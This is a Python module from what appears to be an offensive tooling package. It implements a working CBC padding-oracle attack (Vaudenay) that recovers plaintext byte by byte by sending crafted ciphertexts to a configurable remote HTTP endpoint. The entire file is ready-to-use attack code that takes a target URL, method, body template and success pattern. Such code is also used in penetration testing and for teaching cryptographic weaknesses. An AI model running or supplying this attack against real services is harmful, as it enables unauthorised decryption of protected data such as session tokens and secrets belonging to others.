"""PKCS#7 CBC padding-oracle attack (Vaudenay).

Given:
  - a CBC ciphertext where the IV is prepended to the first ciphertext block
  - an oracle that returns a distinguishable response for valid vs invalid PKCS#7 padding

Recover the plaintext byte-by-byte. One block at a time; per byte, up to 256
oracle calls.
"""
from __future__ import annotations

from typing import Any

from ._common import b64d, b64e, build_oracle, safe_result


def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def _decrypt_block(
    oracle,
    prev_block: bytes,
    target_block: bytes,
    block_size: int,
    max_queries_per_byte: int = 256,
) -> tuple[bytes, int]:
    """Recover intermediate state (= AES_dec(target_block)) for one block.

    Returns (intermediate, queries_used).
    """
    intermediate = bytearray(block_size)
    queries = 0
    for byte_idx in range(block_size - 1, -1, -1):
        pad_val = block_size - byte_idx
        found = False
        for candidate in range(256):
            queries += 1
            if queries > max_queries_per_byte * block_size * 2:
                raise RuntimeError("oracle budget exhausted")
            # Build crafted prefix block
            crafted = bytearray(block_size)
            for j in range(byte_idx + 1, block_size):
                crafted[j] = intermediate[j] ^ pad_val
            crafted[byte_idx] = candidate
            if oracle(bytes(crafted) + target_block):
                # Guard against the edge case where the last byte of the real
                # plaintext is the pad value itself — flip byte_idx-1 to
                # confirm.
                if byte_idx > 0:
                    probe = bytearray(crafted)
                    probe[byte_idx - 1] ^= 1
                    queries += 1
                    if not oracle(bytes(probe) + target_block):
                        # Was a false positive from existing padding. Keep
                        # searching — but remember the first hit.
                        continue
                intermediate[byte_idx] = candidate ^ pad_val
                found = True
                break
        if not found:
            raise RuntimeError(
                f"byte {byte_idx} could not be recovered within budget"
            )
    plaintext_block = _xor(bytes(intermediate), prev_block)
    return plaintext_block, queries


def _strip_pkcs7(b: bytes, block_size: int) -> bytes:
    if not b:
        return b
    pad = b[-1]
    if 1 <= pad <= block_size and b[-pad:] == bytes([pad]) * pad:
        return b[:-pad]
    return b


@safe_result
def attack(
    oracle_url: str,
    ciphertext_b64: str,
    block_size: int = 16,
    oracle_success_regex: str | None = None,
    oracle_success_status: int | None = None,
    oracle_method: str = "POST",
    oracle_body_template: str = "{ciphertext_hex}",
    oracle_content_type: str = "application/x-www-form-urlencoded",
    iv_prepended: bool = True,
    max_blocks: int = 64,
    **_: Any,
) -> dict[str, Any]:
    """Run a PKCS#7 padding-oracle attack.

    :param ciphertext_b64: base64-encoded ciphertext. If ``iv_prepended`` is
        True (default) the first ``block_size`` bytes are treated as IV.
    :param oracle_url: URL of the padding oracle.
    :param oracle_success_regex: regex that matches padding-valid responses.
        Alternatively supply ``oracle_success_status``.
    :param oracle_body_template: string with ``{ciphertext_hex}`` or
        ``{ciphertext_b64}`` placeholder. Defaults to hex body.
    """
    if block_size not in (8, 16):
        return {"ok": False, "reason": f"block_size must be 8 or 16 (got {block_size})"}

    ct = b64d(ciphertext_b64)
    if len(ct) % block_size != 0:
        return {
            "ok": False,
            "reason": f"ciphertext length {len(ct)} not a multiple of {block_size}",
        }

    blocks = [ct[i : i + block_size] for i in range(0, len(ct), block_size)]
    if iv_prepended:
        if len(blocks) < 2:
            return {"ok": False, "reason": "need IV + >=1 ciphertext block"}
    else:
        # Caller asserts IV is all-zero
        blocks = [b"\x00" * block_size] + blocks

    if len(blocks) - 1 > max_blocks:
        return {
            "ok": False,
            "reason": f"ciphertext has {len(blocks)-1} blocks; cap is {max_blocks}",
        }

    oracle = build_oracle(
        url=oracle_url,
        success_regex=oracle_success_regex,
        success_status=oracle_success_status,
        method=oracle_method,
        body_template=oracle_body_template,
        content_type=oracle_content_type,
    )

    plaintext = bytearray()
    total_queries = 0
    for i in range(1, len(blocks)):
        pt_block, q = _decrypt_block(oracle, blocks[i - 1], blocks[i], block_size)
        plaintext.extend(pt_block)
        total_queries += q

    stripped = _strip_pkcs7(bytes(plaintext), block_size)
    return {
        "ok": True,
        "plaintext_b64": b64e(stripped),
        "plaintext_utf8_preview": stripped[:200].decode("utf-8", errors="replace"),
        "queries_used": total_queries,
        "blocks_recovered": len(blocks) - 1,
    }
